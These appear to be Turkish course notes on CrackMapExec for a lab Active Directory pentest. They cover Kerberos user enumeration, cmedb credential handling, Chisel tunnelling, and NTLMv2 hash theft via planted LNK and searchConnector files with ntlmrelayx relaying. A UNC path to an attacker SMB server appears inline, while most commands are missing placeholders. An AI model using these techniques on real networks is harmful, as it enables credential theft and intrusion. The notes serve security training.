+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'print
+
+Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
+
+
+### Kullanıcının Kullanabileceği Dosyaları Listeleme
+
+{{CODE_BLOCK_94}}
+
+Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:
+
+{{CODE_BLOCK_95}}
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
